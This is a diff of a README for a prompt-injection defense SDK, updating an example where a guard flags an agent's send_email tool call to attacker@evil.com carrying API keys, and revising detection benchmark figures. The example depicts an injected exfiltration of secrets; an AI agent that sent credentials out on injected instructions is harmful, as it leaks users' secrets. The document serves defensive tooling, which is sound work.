@@ -50,8 +50,11 @@ result = guard.check_tool_call(
     "send_email",
     {"to": "attacker@evil.com", "body": "Here are the API keys..."},
 )
-print(result.action)   # review or block
+print(result.action)   # "review" — the retrieved scan above tainted the session
 print(result.findings) # evidence with span offsets
+
+# Note: without that tainted scan, this same call returns "allow". Tool decisions
+# follow provenance, not the argument text — that is the point of the taint model.
 ```
 
 One line upgrades detection to the ML span model (downloads [unplug-tiny-v1](https://huggingface.co/Unplug-AI/unplug-tiny-v1) once, cached):
@@ -66,14 +69,14 @@ Try it without installing anything: [live demo](https://huggingface.co/spaces/Un
 
 | Capability | Status |
 |------------|--------|
-| Regex + normalization injection detection | **Included** (fast, offline) |
+| Regex + normalization injection detection | **Included** (fast, offline) — but see recall caveat below; not a complete defense on its own |
 | TaintedText provenance + session taint | **Included** |
 | Tool-call enforcement (destructive block, tainted review) | **Included** |
 | Span-level redaction | **Included** |
 | ML span model `Guard.with_tiny()` | **Preview** ([unplug-tiny-v1](https://huggingface.co/Unplug-AI/unplug-tiny-v1)) |
 | Sliding-window long documents + streaming scan | **Included** |
 
-On the neuralchemy prompt-injection set, regex-only detection reaches **F1 0.56 / recall 0.39** — a fast first line, not sufficient alone. Adding the ML span model (`Guard.with_tiny()`) takes that to **F1 0.99 / recall 0.98**, and lifts recall on *indirect* injection from **0.05 → 0.91**. False-positive rate stays under 1% on the injection set (2.1% on a separate hard-benign corpus). Full tables, methodology, and honest caveats: [`sdk/docs/BENCHMARKS.md`](sdk/docs/BENCHMARKS.md). Per-axis model metrics (including failure modes) are on the [model card](https://huggingface.co/Unplug-AI/unplug-tiny-v1).
+On the neuralchemy prompt-injection set, regex-only detection reaches **F1 0.575 / recall 0.405** — a fast first line, not sufficient alone. Adding the ML span model (`Guard.with_tiny()`) takes that to **F1 0.99 / recall 0.98**, and lifts recall on *indirect* injection from **0.05 → 0.91**. False-positive rate stays under 1% on the injection set (2.1% on a separate hard-benign corpus). Full tables, methodology, and honest caveats: [`sdk/docs/BENCHMARKS.md`](sdk/docs/BENCHMARKS.md). Per-axis model metrics (including failure modes) are on the [model card](https://huggingface.co/Unplug-AI/unplug-tiny-v1).
 
 ## Agent host checklist
 
